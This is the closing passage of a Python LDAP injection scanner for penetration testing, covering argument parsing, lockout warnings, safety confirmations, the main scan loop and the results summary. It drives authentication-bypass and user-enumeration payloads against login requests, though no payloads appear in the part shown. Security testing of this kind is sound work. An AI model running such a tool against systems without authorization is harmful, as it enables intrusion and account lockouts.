            json.dump(payload, f, indent=2, ensure_ascii=False)

    # --------------------------------------------------------------------
    def print_summary(self, output_path: str) -> None:
        elapsed = time.time() - self.start_time
        mins = int(elapsed // 60)
        secs = int(elapsed % 60)
        target = build_url(self.parsed, self.args.ssl)

        bar = "═" * 50
        print()
        print(f"{Fore.CYAN}{bar}{Style.RESET_ALL}")
        print(f"{Fore.CYAN} SCAN COMPLETE{Style.RESET_ALL}")
        print(f" Target          : {target}")
        print(f" Total requests  : {self.total_sent}")
        print(f" Findings        : {self.findings}")
        print(f" High confidence : {self.high_confidence}")
        print(f" Duration        : {mins}m {secs}s")
        print(f" Report saved    : {output_path}")
        print(f"{Fore.CYAN}{bar}{Style.RESET_ALL}")


# ============================================================================
# SIGNAL HANDLING
# ============================================================================

def _sigint_handler(signum, frame):
    global _INTERRUPTED
    if _INTERRUPTED:
        # Second Ctrl+C — force exit
        sys.stderr.write("\nForce exit.\n")
        sys.exit(130)
    _INTERRUPTED = True
    print()
    warn("Interrupted by user (Ctrl+C). Saving partial results and exiting cleanly...")


signal.signal(signal.SIGINT, _sigint_handler)


# ============================================================================
# CLI / MAIN
# ============================================================================

def build_argparser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="ldapscanner.py",
        description="LDAP Injection Scanner for authorized penetration testing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Markers (place inside the request body):\n"
            "  USERNAME   inject wordlist payloads (no lockout risk by default)\n"
            "  KNOWNUSER  payload appended to a real user (requires --known-user)\n"
            "  PASSWORD   dummy value unless --inject-password is set\n"
            "  DOMAIN     domain-relevant payloads only\n"
            "  FUZZ       general-purpose injection\n"
        ),
    )
    p.add_argument("-r", "--request", required=True,
                   help="Path to raw HTTP request .txt file (Burp copy-paste)")
    p.add_argument("-w", "--wordlist", default=None,
                   help="External wordlist file (overrides built-in)")
    p.add_argument("--known-user", default=None,
                   help="Real username for KNOWNUSER marker")
    p.add_argument("--inject-password", action="store_true",
                   help="Also inject payloads into PASSWORD field (lockout risk)")
    p.add_argument("--mode", choices=["full", "bypass", "enum"], default="full",
                   help="Scan mode (default: full)")
    p.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                   help=f"Seconds between requests (default: {DEFAULT_DELAY})")
    p.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS,
                   help=f"Max attempts for KNOWNUSER (default: {DEFAULT_MAX_ATTEMPTS})")
    p.add_argument("--force", action="store_true",
                   help=f"Allow delay below {KNOWNUSER_MIN_DELAY}s minimum (extra warning)")
    p.add_argument("--encode", action="store_true",
                   help="URL-encode payloads (skips already-encoded ones)")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                   help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    p.add_argument("--baseline-user", default=None,
                   help="Known valid username for success baseline")
    p.add_argument("--baseline-pass", default=None,
                   help="Known valid password for success baseline")
    p.add_argument("--success-kw", default=None,
                   help="Comma-separated success keywords (overrides defaults)")
    p.add_argument("--error-kw", default=None,
                   help="Comma-separated error keywords (overrides defaults)")
    p.add_argument("--threshold", type=int, default=DEFAULT_THRESHOLD,
                   help=f"Length diff threshold in bytes (default: {DEFAULT_THRESHOLD})")
    p.add_argument("--proxy", default=None,
                   help="Proxy URL e.g. http://127.0.0.1:8080")
    p.add_argument("--ssl", action="store_true",
                   help="Force HTTPS")
    p.add_argument("--no-verify", action="store_true",
                   help="Disable SSL certificate verification")
    p.add_argument("--legacy-ssl", action="store_true",
                   help="Enable TLS legacy renegotiation + lower cipher SECLEVEL "
                        "(for older IIS / appliances that fail with "
                        "UNSAFE_LEGACY_RENEGOTIATION_DISABLED)")
    p.add_argument("--output", default=None,
                   help="Custom JSON output filename")
    p.add_argument("--only-findings", action="store_true",
                   help="Only write triggered results to JSON")
    p.add_argument("--verbose", action="store_true",
                   help="Print all requests including clean ones")
    return p


def default_output_path() -> str:
    return f"ldap_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"


def preflight_safety_prompts(markers_found: List[str], args: argparse.Namespace) -> bool:
    """
    Show lockout warnings and ask confirmations for risky markers.
    Returns False if user declines.
    """
    will_use_knownuser = "KNOWNUSER" in markers_found
    will_inject_pw = ("PASSWORD" in markers_found) and args.inject_password

    if will_use_knownuser:
        if not args.known_user:
            err("KNOWNUSER marker present in request but --known-user not provided.")
            return False
        warn("=" * 60)
        warn(" KNOWNUSER injection ENABLED")
        warn(f" Real user '{args.known_user}' will receive {args.max_attempts} crafted login attempts.")
        warn(" This may TRIGGER ACCOUNT LOCKOUT depending on AD/LDAP policy.")
        warn("=" * 60)
        if args.delay < KNOWNUSER_MIN_DELAY:
            if args.force:
                warn(f" --force is set: delay {args.delay}s is BELOW the {KNOWNUSER_MIN_DELAY}s safety floor.")
                warn(" This dramatically raises lockout / detection risk. Proceed with care.")
            else:
                warn(f" Your --delay ({args.delay}s) is below the {KNOWNUSER_MIN_DELAY}s minimum.")
                warn(f" Enforcing {KNOWNUSER_MIN_DELAY}s minimum (pass --force to override).")
        if not confirm("Proceed with KNOWNUSER scan?"):
            info("Aborted by user.")
            return False

    if will_inject_pw:
        warn("=" * 60)
        warn(" PASSWORD injection ENABLED (--inject-password)")
        warn(" Injecting payloads into the password field may trigger lockouts.")
        warn("=" * 60)
        if not confirm("Proceed with PASSWORD injection?"):
            info("Aborted by user.")
            return False

    return True


def main() -> int:
    print(Fore.CYAN + BANNER.format(ver=VERSION) + Style.RESET_ALL)

    parser = build_argparser()
    args = parser.parse_args()

    # Parse request
    try:
        parsed = parse_request(args.request)
    except (FileNotFoundError, ValueError) as e:
        err(str(e))
        return 2

    info(f"Loaded request: {parsed['method']} {parsed['path']} (Host: {parsed['host']})")

    # ASP.NET token warning
    aspnet = detect_aspnet_tokens(parsed["body"])
    if aspnet:
        warn(f"ASP.NET session tokens detected: {', '.join(aspnet)}")
        warn("These expire quickly. Re-capture from Burp if you see 400/500 errors.")

    # Detect markers
    markers_found = detect_markers(parsed)
    if not markers_found:
        err("No markers found in the request. Place at least one of: "
            + ", ".join(MARKERS))
        return 2

    info(f"Markers detected: {', '.join(markers_found)}")
    marker_to_field = map_markers_to_fields(parsed["body"])
    if marker_to_field:
        for m, f in marker_to_field.items():
            info(f"  {m} -> field '{f}'")

    # Safety prompts
    if not preflight_safety_prompts(markers_found, args):
        return 1

    # Load + filter payloads
    try:
        payloads = load_payloads(args)
    except FileNotFoundError as e:
        err(str(e))
        return 2

    info(f"Total payloads loaded: {len(payloads)}")
    if args.mode != "full":
        info(f"Mode filter: {args.mode}")

    if args.encode:
        info("URL encoding ENABLED (already-encoded payloads will be skipped)")
    if args.no_verify:
        warn("SSL certificate verification DISABLED")
    if args.proxy:
        info(f"Proxy: {args.proxy}")

    # Output path
    output_path = args.output or default_output_path()
    _PARTIAL_STATE["output_path"] = output_path

    # Run scan
    scanner = Scanner(parsed, payloads, args, markers_found, marker_to_field)
    exit_code = 0
    try:
        scanner.run()
    except RuntimeError as e:
        err(str(e))
        exit_code = 3
    except Exception as e:  # noqa: BLE001
        err(f"Unhandled error during scan: {e}")
        exit_code = 4

    # Save results (always, even on interrupt or partial)
    try:
        scanner.save_results(output_path)
    except Exception as e:  # noqa: BLE001
        err(f"Failed to save results: {e}")
        exit_code = exit_code or 5

    scanner.print_summary(output_path)

    if _INTERRUPTED:
        return 130
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
